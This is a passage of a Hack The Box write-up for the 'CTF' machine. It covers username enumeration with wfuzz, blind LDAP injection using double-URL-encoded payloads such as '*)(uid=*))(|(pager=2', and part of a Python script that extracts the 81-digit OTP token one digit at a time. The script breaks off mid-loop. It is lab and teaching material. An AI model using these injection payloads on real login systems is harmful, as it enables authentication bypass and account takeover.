&lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;      
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;footer&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;mastfoot mt-auto text-center&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;inner&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;p&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;CTF&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt; by &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://www.hackthebox.eu/home/users/profile/13340&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;target=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;_blank&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;0xEA31&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;. Cover template for &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://getbootstrap.com/&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Bootstrap&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;, by &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://twitter.com/mdo&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;@mdo&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;.&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;/footer&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;

    &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- Bootstrap core JavaScript
    ================================================== --&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- Placed at the end of the document so the pages load faster --&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://code.jquery.com/jquery-3.3.1.slim.min.js&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;integrity=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;crossorigin=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;anonymous&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/dist/js/bootstrap.min.js&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;these-comments-look-interesting-&quot;&gt;These comments look interesting :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;!-- we'll change the schema in the next phase of the project (if and only if we will pass the VA/PT) --&amp;gt;
      &amp;lt;!-- at the moment we have choosen an already existing attribute in order to store the token string (81 digits) --&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;so-now-we-know-that-they-are-using-a-token-to-generate-the-otps-we-also-know-that-the-length-of-the-token-is-81-digits-but-i-still-couldnt-figure-out-that-part-about-the-attribute-theyre-using-to-store-the-token-i-decided-to-bruteforce-the-username-then-return-to-the-otp-thing-again&quot;&gt;So now we know that they are using a token to generate the &lt;code class=&quot;highlighter-rouge&quot;&gt;OTP&lt;/code&gt;s, we also know that the length of the token is 81 digits. But I still couldn’t figure out that part about the attribute they’re using to store the token. I decided to bruteforce the username then return to the &lt;code class=&quot;highlighter-rouge&quot;&gt;OTP&lt;/code&gt; thing again.&lt;/h4&gt;
&lt;h4 id=&quot;i-know-what-youre-thinking-how-will-i-bruteforce-the-username-without-getting-banned--well-i-tried-to-pass-any-credentials-to-see-how-will-the-application-respond-&quot;&gt;I know what you’re thinking, how will I bruteforce the username without getting banned ? Well I tried to pass any credentials to see how will the application respond :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ctf/4.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/ctf/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;here-i-noticed-2-things-first-thing-is-that-its-actually-telling-us-if-the-user-exists-or-not-which-means-that-we-can-enumerate-users-the-other-thing-is-that-it-responded-normally-with-a-200-ok-response-so-if-the-server-identifies-a-bruteforce-attack-by-monitoring-how-many-times-an-ip-causes-errors-like-404-for-example-as-long-as-we-are-not-causing-errors-we-wont-get-banned-i-gave-it-a-try-to-see-if-it-will-actually-work-i-used-wfuzz-and-multiplesources-users-fabian-fingerledetxt-from-seclists-&quot;&gt;Here I noticed 2 things. First thing is that it’s actually telling us if the user exists or not, which means that we can enumerate users. The other thing is that it responded normally with a &lt;code class=&quot;highlighter-rouge&quot;&gt;200 OK&lt;/code&gt; response, so If the server identifies a bruteforce attack by monitoring how many times an ip causes errors like &lt;code class=&quot;highlighter-rouge&quot;&gt;404&lt;/code&gt; for example, as long as we are not causing errors we won’t get banned. I gave it a try to see if it will actually work. I used &lt;code class=&quot;highlighter-rouge&quot;&gt;wfuzz&lt;/code&gt; and &lt;a href=&quot;https://github.com/danielmiessler/SecLists/blob/master/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;multiplesources-users-fabian-fingerle.de.txt&lt;/code&gt;&lt;/a&gt; from &lt;a href=&quot;https://github.com/danielmiessler/SecLists&quot;&gt;seclists&lt;/a&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/ctf# wfuzz -c -u http://ctf.htb/login.php -X POST -d &quot;inputUsername=FUZZ&amp;amp;inputOTP=0000&quot; -w ./multiplesources-users-fabian-fingerle.de.txt 

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.3.4 - The Web Fuzzer                         *
********************************************************

Target: http://ctf.htb/login.php
Total requests: 21168

==================================================================
ID   Response   Lines      Word         Chars          Payload    
==================================================================

000007:  C=200     68 L      229 W         2810 Ch        &quot;!@#%^&amp;amp;*(&quot;
000008:  C=200     68 L      229 W         2810 Ch        &quot;!@#%^&amp;amp;*()&quot;
000010:  C=200     68 L      229 W         2810 Ch        &quot;*****&quot;
000002:  C=200     68 L      229 W         2810 Ch        &quot;!@#&quot;
000003:  C=200     68 L      229 W         2810 Ch        &quot;!@#%&quot;
000004:  C=200     68 L      229 W         2810 Ch        &quot;!@#%^&quot;
000005:  C=200     68 L      229 W         2810 Ch        &quot;!@#%^&amp;amp;&quot;
000009:  C=200     68 L      233 W         2827 Ch        &quot;&quot;&quot;&quot;
000006:  C=200     68 L      229 W         2810 Ch        &quot;!@#%^&amp;amp;*&quot;
000001:  C=200     68 L      233 W         2826 Ch        &quot;-&quot;
000011:  C=200     68 L      233 W         2826 Ch        &quot;0&quot;
000012:  C=200     68 L      233 W         2827 Ch        &quot;00&quot;
000021:  C=200     68 L      233 W         2835 Ch        &quot;0123456789&quot;
000015:  C=200     68 L      233 W         2833 Ch        &quot;00000000&quot;
000016:  C=200     68 L      233 W         2827 Ch        &quot;01&quot;
^C
Finishing pending requests...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;all-user-not-found-responses-have-233-words-so-i-filtered-them-&quot;&gt;All “user not found” responses have 233 words so I filtered them :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/ctf# wfuzz -c --hw 233 -u http://ctf.htb/login.php -X POST -d &quot;inputUsername=FUZZ&amp;amp;inputOTP=0000&quot; -w ./multiplesources-users-fabian-fingerle.de.txt                                  

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.3.4 - The Web Fuzzer                         *
********************************************************

Target: http://ctf.htb/login.php
Total requests: 21168

==================================================================
ID   Response   Lines      Word         Chars          Payload    
==================================================================

000006:  C=200     68 L      229 W         2810 Ch        &quot;!@#%^&amp;amp;*&quot;
000003:  C=200     68 L      229 W         2810 Ch        &quot;!@#%&quot;
000004:  C=200     68 L      229 W         2810 Ch        &quot;!@#%^&quot;
000005:  C=200     68 L      229 W         2810 Ch        &quot;!@#%^&amp;amp;&quot;
000007:  C=200     68 L      229 W         2810 Ch        &quot;!@#%^&amp;amp;*(&quot;
000008:  C=200     68 L      229 W         2810 Ch        &quot;!@#%^&amp;amp;*()&quot;
000002:  C=200     68 L      229 W         2810 Ch        &quot;!@#&quot;
000010:  C=200     68 L      229 W         2810 Ch        &quot;*****&quot;
000065:  C=200     68 L      229 W         2810 Ch        &quot;123456*a&quot;
005121:  C=200     68 L      229 W         2810 Ch        &quot;Ch4ng3m3!&quot;
005723:  C=200     68 L      229 W         2810 Ch        &quot;*%Cookie:&quot;
009377:  C=200     68 L      229 W         2810 Ch        &quot;!!Huawei&quot;
011497:  C=200     68 L      231 W         2822 Ch        &quot;ldapuser&quot;
011866:  C=200     68 L      234 W         2835 Ch        &quot;lost+found&quot;
012611:  C=200     68 L      233 W         2831 Ch        &quot;maurta&quot;^C
Finishing pending requests...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;it-worked-and-i-didnt-get-banned-after-some-time-i-got-a-result-which-was-ldapuser-thats-weird-i-also-noticed-that-payloads-that-had-special-characters-in-them-caused-different-response-length-i-tried-ldapuser-to-see-whats-the-other-message-&quot;&gt;It worked and I didn’t get banned, after some time I got a result which was &lt;code class=&quot;highlighter-rouge&quot;&gt;ldapuser&lt;/code&gt;, that’s weird. I also noticed that payloads that had special characters in them caused different response length. I tried &lt;code class=&quot;highlighter-rouge&quot;&gt;ldapuser&lt;/code&gt; to see what’s the other message :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ctf/6.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/ctf/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-was-cannot-login&quot;&gt;It was “Cannot login”&lt;/h4&gt;
&lt;h4 id=&quot;then-i-tried--and-i-got-nothing-i-just-got-the-login-page-back-again-without-any-messages-i-figured-out-that-the-username-is-being-used-in-an-ldap-query-and-its-injectable-because-of-the-special-chars-payloads-also-that-existing-attribute-where-the-token-is-stored-is-an-ldap-attribute-with-the-injection-we-have-we-can-extract-the-token-and-use-it-to-generate-valid-otps-but-because-the-injection-is-blind-it-will-be-kinda-tricky-to-extract-the-token&quot;&gt;Then I tried &lt;code class=&quot;highlighter-rouge&quot;&gt;!@#%^&amp;amp;*&lt;/code&gt; and I got nothing, I just got the login page back again without any messages. I figured out that the username is being used in an &lt;code class=&quot;highlighter-rouge&quot;&gt;ldap&lt;/code&gt; query, and it’s injectable (because of the special chars payloads). Also that existing attribute where the token is stored is an &lt;code class=&quot;highlighter-rouge&quot;&gt;ldap&lt;/code&gt; attribute. With the injection we have we can extract the token and use it to generate valid &lt;code class=&quot;highlighter-rouge&quot;&gt;OTP&lt;/code&gt;s. But because the injection is blind it will be kinda tricky to extract the token.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;ldap-injection&quot;&gt;LDAP Injection&lt;/h3&gt;
&lt;h4 id=&quot;as-i-said-its-a-blind-injection-which-means-that-we-wont-get-any-results-but-a-payload-like-this-uiduid--should-result-in-cannot-login-however-when-i-tried-it-i-didnt-get-any-message-so-i-tried-to-url-encode-the-payload-and-it-worked-so-the-injection-works-when-the-payload-is-double-url-encoded-i-only-encoded-the-payload-once-because-the-browser-automatically-encodes-post-data-i-switched-to-burp-here-are-the-results-&quot;&gt;As I said, it’s a blind injection which means that we won’t get any results. But a payload like this :&lt;code class=&quot;highlighter-rouge&quot;&gt;*)(uid=*))(|(uid=*&lt;/code&gt;  should result in “Cannot login”. However when I tried it I didn’t get any message, So I tried to URL encode the payload and it worked. So the injection works when the payload is double URL encoded (I only encoded the payload once because the browser automatically encodes POST data). I switched to burp, here are the results :&lt;/h4&gt;
&lt;h4 id=&quot;request-&quot;&gt;Request :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /login.php HTTP/1.1
Host: ctf.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://ctf.htb/login.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 190
Cookie: PHPSESSID=sqmpanb3d1uui0pf4uafubv010
Connection: close
Upgrade-Insecure-Requests: 1

inputUsername=%25%32%61%25%32%39%25%32%38%25%37%35%25%36%39%25%36%34%25%33%64%25%32%61%25%32%39%25%32%39%25%32%38%25%37%63%25%32%38%25%37%35%25%36%39%25%36%34%25%33%64%25%32%61&amp;amp;inputOTP=0000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;response-&quot;&gt;Response :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
HTTP/1.1 200 OK
Date: Fri, 19 Jul 2019 17:58:29 GMT
Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16
X-Powered-By: PHP/5.4.16
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Content-Length: 2822
Connection: close
Content-Type: text/html; charset=UTF-8

&lt;span class=&quot;cp&quot;&gt;&amp;lt;!doctype html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;lang=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;en&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
	---------
	 Removed
	---------
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;col-sm-10&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    Cannot login    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
	---------
	 Removed
	---------
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;now-we-need-to-know-which-attribute-the-token-is-stored-in-we-know-its-an-existing-attribute-so-we-just-need-to-choose-the-right-one-i-checked-ldap-attributes-and-chose-some-of-them-to-test-comment-pager-and-info-the-payload-will-be-like-this--uidattribute-instead-of-the-second-uid-attribute-we-will-use-the-attribute-we-are-testing-we-also-know-that-the-token-is-numeric-so-we-can-remove--and-replace-it-with-numeric-values-from-0-to-9-and-monitor-the-responses-i-used-burp-intruder-to-do-this-so-the-final-payload-will-be-like-this--uidattributen-after-some-testing-this-payload-with-the-attribute-pager-and-value-of-2--uidpager2-resulted-in-cannot-login-message-great-so-our-payload-will-be-uidpager2n-and-we-will-bruteforce-the-second-number-again-until-we-get-cannot-login-we-will-keep-repeating-this-until-we-reach-the-81st-number-but-doing-this-manually-is-lame-and-boring-so-i-wrote-a-python-script&quot;&gt;Now we need to know which attribute the token is stored in. We know it’s an existing attribute so we just need to choose the right one. I checked &lt;a href=&quot;https://docs.bmc.com/docs/fpsc121/ldap-attributes-and-associated-fields-495323340.html&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ldap&lt;/code&gt; attributes&lt;/a&gt; and chose some of them to test (&lt;code class=&quot;highlighter-rouge&quot;&gt;comment&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;pager&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;info&lt;/code&gt;), the payload will be like this : &lt;code class=&quot;highlighter-rouge&quot;&gt;*)(uid=*))(|(ATTRIBUTE=*&lt;/code&gt; (instead of the second &lt;code class=&quot;highlighter-rouge&quot;&gt;uid&lt;/code&gt; attribute we will use the attribute we are testing). We also know that the token is numeric so we can remove &lt;code class=&quot;highlighter-rouge&quot;&gt;*&lt;/code&gt; and replace it with numeric values from 0 to 9 and monitor the responses (I used burp intruder to do this). So the final payload will be like this : &lt;code class=&quot;highlighter-rouge&quot;&gt;*)(uid=*))(|(ATTRIBUTE=N&lt;/code&gt;. After some testing this payload with the attribute &lt;code class=&quot;highlighter-rouge&quot;&gt;pager&lt;/code&gt; and value of 2 : &lt;code class=&quot;highlighter-rouge&quot;&gt;*)(uid=*))(|(pager=2&lt;/code&gt; resulted in “Cannot login” message. Great so our payload will be &lt;code class=&quot;highlighter-rouge&quot;&gt;*)(uid=*))(|(pager=2N&lt;/code&gt; and we will bruteforce the second number again until we get “Cannot login”. We will keep repeating this until we reach the 81st number, but doing this manually is lame and boring so I wrote a python script.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;exploitation-token-extraction&quot;&gt;Exploitation, Token Extraction&lt;/h3&gt;
&lt;h4 id=&quot;i-created-3-functions-&quot;&gt;I created 3 functions :&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;
    &lt;h4 id=&quot;send_payload--to-send-the-injection-payload-and-receive-the-response&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;send_payload&lt;/code&gt;  (to send the injection payload and receive the response)&lt;/h4&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;h4 id=&quot;check_response-to-check-whether-the-response-contains-cannot-login-or-not&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;check_response&lt;/code&gt; (to check whether the response contains “Cannot login” or not)&lt;/h4&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;h4 id=&quot;exploit--this-function-creates-a-list-of-numbers-from-0-to-9-then-by-looping-through-that-list-it-creates-the-payload-which-is--2a2928uid3d2a2929287c28pager3d--token--number--2a-encoded-only-once-because-python-requests-automatically-encodes-post-data-then-it-calls-send_payload-and-check_response-if-check_response-returned-true-it-adds-the-valid-number-to-the-token&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;exploit&lt;/code&gt; : This function creates a list of numbers from 0 to 9, then by looping through that list it creates the payload which is : &lt;code class=&quot;highlighter-rouge&quot;&gt;%2A%29%28uid%3D%2A%29%29%28%7C%28pager%3D&lt;/code&gt; + token + number + &lt;code class=&quot;highlighter-rouge&quot;&gt;%2A&lt;/code&gt; (encoded only once because python requests automatically encodes POST data). Then it calls &lt;code class=&quot;highlighter-rouge&quot;&gt;send_payload&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;check_response&lt;/code&gt;, if &lt;code class=&quot;highlighter-rouge&quot;&gt;check_response&lt;/code&gt; returned &lt;code class=&quot;highlighter-rouge&quot;&gt;True&lt;/code&gt; it adds the valid number to the token.&lt;/h4&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;then-i-wrote-a-while-loop-to-keep-calling-exploit-as-long-as-lentoken-is-not-81&quot;&gt;Then I wrote a &lt;code class=&quot;highlighter-rouge&quot;&gt;while&lt;/code&gt; loop to keep calling &lt;code class=&quot;highlighter-rouge&quot;&gt;exploit()&lt;/code&gt; as long as &lt;code class=&quot;highlighter-rouge&quot;&gt;len(token)&lt;/code&gt; is not 81&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;extract_tokenpy-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;extract_token.py&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python3&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;YELLOW&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\033&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[93m&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;GREEN&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\033&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[32m&quot;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;send_payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;post_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;inputUsername&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;inputOTP&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0000&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;req&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://10.10.10.122/login.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;check_response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Cannot login&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;n_list&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
